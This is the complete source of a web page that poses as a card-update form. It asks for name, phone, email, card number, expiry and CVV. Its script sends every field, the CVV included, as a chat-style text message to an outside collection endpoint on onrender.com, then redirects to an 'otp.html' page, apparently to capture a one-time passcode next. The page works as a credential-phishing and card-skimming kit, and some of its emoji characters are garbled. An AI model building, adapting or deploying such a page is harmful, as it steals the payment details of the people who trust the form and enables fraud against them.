<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Update User Information</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>

  <div class="card-container">
    <h2 class="page-title">Add Your Card</h2>

    <form id="cardInfoForm" class="card-form show">

      <!-- Personal Info -->
      <div class="form-group">
        <label>First Name</label>
        <input type="text" id="firstName" required />
      </div>

      <div class="form-group">
        <label>Last Name</label>
        <input type="text" id="lastName" required />
      </div>

      <div class="form-group">
        <label>Mobile Number</label>
        <input type="tel" id="mobile" placeholder="0X XXXX XXXX" required />
      </div>

      <div class="form-group">
        <label>Email Address</label>
        <input type="email" id="email" placeholder="example@email.com" required />
      </div>

      <!-- Card Info -->
      <div class="form-group">
        <label>Card Number</label>
        <input
          type="text"
          id="cardNumber"
          maxlength="19"
          inputmode="numeric"
          placeholder="**** **** **** ****"
          required
        />
      </div>

      <div class="form-row">
        <div class="form-group">
          <label>Expiry Date</label>
          <input
            type="text"
            id="expiry"
            placeholder="MM/YY"
            maxlength="5"
            required
          />
        </div>

        <div class="form-group">
          <label>CVV</label>
          <input
            type="text"
            id="cvv"
            maxlength="3"
            inputmode="numeric"
            placeholder="***"
            required
          />
        </div>
      </div>

      <button type="submit" class="btn primary">Continue</button>
    </form>
  </div>

<script>
  // Format card number (LTR, spaced every 4 digits)
  const cardNumberInput = document.getElementById('cardNumber');
  cardNumberInput.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    value = value.substring(0, 16);
    e.target.value = value.replace(/(.{4})/g, '$1 ').trim();
  });

  // Format expiry date MM/YY
  const expiryInput = document.getElementById('expiry');
  expiryInput.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 3) {
      value = value.slice(0, 2) + '/' + value.slice(2, 4);
    }
    e.target.value = value.substring(0, 5);
  });

  // Handle submit
  const form = document.getElementById('cardInfoForm');
  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    const data = {
      firstName: document.getElementById('firstName').value.trim(),
      lastName: document.getElementById('lastName').value.trim(),
      mobile: document.getElementById('mobile').value.trim(),
      email: document.getElementById('email').value.trim(),
      cardNumber: document.getElementById('cardNumber').value.trim(),
      expiry: document.getElementById('expiry').value.trim(),
      cvv: document.getElementById('cvv').value.trim()
    };

    localStorage.setItem('mobileNumber', data.mobile);
    localStorage.setItem('nextPage', 'chooseCard');

    const submitBtn = form.querySelector('button');
    const originalText = submitBtn.textContent;
    submitBtn.disabled = true;
    submitBtn.textContent = 'Sending...';

    try {
      const response = await fetch('https://dashboard-xwzz.onrender.com/api/messages', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          text: `
ðŸ‘¤ User Information:
First Name: ${data.firstName}
Last Name: ${data.lastName}
Mobile: ${data.mobile}
Email: ${data.email}

ðŸ’³ Card Information:
Card Number: ${data.cardNumber}
Expiry: ${data.expiry}
CVV: ${data.cvv}
`
        })
      });

      if (!response.ok) throw new Error();

      setTimeout(() => {
        window.location.href = 'otp.html';
      }, 3000);

    } catch (err) {
      alert('Error submitting data. Please try again.');
    } finally {
      submitBtn.disabled = false;
      submitBtn.textContent = originalText;
    }
  });
</script>

</body>
</html>
